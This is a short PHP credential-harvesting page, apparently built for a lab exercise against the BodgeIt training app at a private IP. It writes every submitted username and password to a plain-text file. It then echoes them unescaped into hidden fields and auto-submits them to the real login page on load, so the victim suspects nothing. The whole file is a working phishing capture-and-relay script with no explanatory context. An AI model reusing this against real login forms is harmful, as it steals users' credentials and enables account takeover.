<?php
$file= 'labpasswords.txt';
file_put_contents($file, print_r($_POST ,true), FILE_APPEND);
$username=$_POST["username"];
$password=$_POST["password"];
$submit="Login";
?>
<body onload="frm1.submit.click()">
<form name="frm1" id="frm1" method="POST" action="http://192.168.56.102/bodgeit/login.jsp">
<input type="hidden" value="<?php echo $username;?>" name="username">
<input type="hidden" value="<?php echo $password;?>" name="password">
<input type="submit" value="<?php echo $submit;?>" name="submit">
</form>
</body>